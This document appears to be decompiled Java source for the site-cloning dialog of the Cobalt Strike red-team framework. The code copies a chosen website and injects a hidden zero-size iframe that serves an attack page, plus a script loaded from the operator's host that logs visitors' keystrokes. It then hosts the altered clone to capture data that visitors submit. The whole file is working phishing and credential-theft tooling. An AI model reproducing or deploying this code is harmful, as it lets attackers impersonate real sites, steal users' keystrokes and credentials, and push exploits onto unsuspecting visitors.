package aggressor.dialogs;

import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.MultiFrame;
import common.Callback;
import common.CommonUtils;
import common.TeamQueue;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import java.awt.event.ActionEvent;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class CloneSiteDialog implements DialogListener, Callback {
   protected MultiFrame window;
   protected JFrame dialog = null;
   protected TeamQueue conn = null;
   protected DataManager datal = null;
   protected Map options;
   protected String desc;
   protected String proto;

   public CloneSiteDialog(MultiFrame var1, TeamQueue var2, DataManager var3) {
      this.window = var1;
      this.conn = var2;
      this.datal = var3;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      this.options = var2;
      this.proto = DialogUtils.bool(var2, "ssl") ? "https://" : "http://";
      String var3 = DialogUtils.string(var2, "cloneme");
      this.conn.call("cloudstrike.clone_site", CommonUtils.args(var3), this);
   }

   public String updateRequest(String var1, String var2, boolean var3) {
      String var4;
      if (!"".equals(var2)) {
         var4 = "<IFRAME SRC=\"" + var2 + "\" WIDTH=\"0\" HEIGHT=\"0\"></IFRAME>";
         var1 = var1.replaceFirst("(?i:</body>)", "\n" + var4 + "\n$0");
         if (!CommonUtils.isin(var4, var1)) {
            var1 = var1 + var4;
         }

         this.desc = this.desc + ". Serves " + var2;
      }

      if (var3) {
         var4 = "<script src=\"" + this.proto + this.options.get("host") + ":" + DialogUtils.string(this.options, "port") + "/jquery/jquery.min.js\"></script>";
         var1 = var1.replaceFirst("(?i:</body>)", "\n" + var4 + "\n$0");
         if (!CommonUtils.isin(var4, var1)) {
            var1 = var1 + var4;
         }

         this.desc = this.desc + ". Logs keys";
      }

      return var1;
   }

   public void result(String var1, Object var2) {
      String var3 = DialogUtils.string(this.options, "cloneme");
      String var4 = DialogUtils.string(this.options, "attack");
      String var5 = DialogUtils.string(this.options, "uri");
      String var6 = DialogUtils.string(this.options, "host");
      String var7 = DialogUtils.string(this.options, "port");
      boolean var8 = DialogUtils.bool(this.options, "ssl");
      boolean var9 = DialogUtils.bool(this.options, "capture");
      this.desc = "Clone of: " + var3;
      String var10;
      if ("cloudstrike.clone_site".equals(var1)) {
         var10 = (String)var2;
         if (var10.length() == 0) {
            DialogUtils.showError("Clone of " + var3 + " is empty.\nTry to connect with HTTPS instead.");
         } else if (var10.startsWith("error: ")) {
            DialogUtils.showError("Could not clone: " + var3 + "\n" + var10.substring(7));
         } else {
            var10 = this.updateRequest(var10, var4, var9);
            this.conn.call("cloudstrike.host_site", CommonUtils.args(var6, Integer.parseInt(var7), var8, var5, var10, var9 + "", this.desc, var3), this);
         }
      } else {
         var10 = var2 + "";
         if ("success".equals(var10)) {
            DialogUtils.startedWebService("cloned site", this.proto + var6 + ":" + var7 + var5);
         } else {
            DialogUtils.showError("Unable to start web server:\n" + var10);
         }
      }

   }

   public void show() {
      this.dialog = DialogUtils.dialog("Clone Site", 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.set("uri", "/");
      var1.set("port", "80");
      var1.set("host", DataUtils.getLocalIP(this.datal));
      var1.text("cloneme", "Clone URL:", 10);
      var1.text("uri", "Local URI:", 20);
      var1.text("host", "Local Host:", 20);
      var1.text("port", "Local Port:", 20);
      var1.site("attack", "Attack:", this.conn, this.datal);
      var1.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.datal));
      var1.checkbox_add("capture", "", "Log keystrokes on cloned site", true);
      JButton var2 = var1.action("Clone");
      JButton var3 = var1.help("https://www.cobaltstrike.com/help-website-clone-tool");
      this.dialog.add(DialogUtils.description("The site cloner copies a website and fixes the code so images load. You may add exploits to cloned sites or capture data submitted by visitors"), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
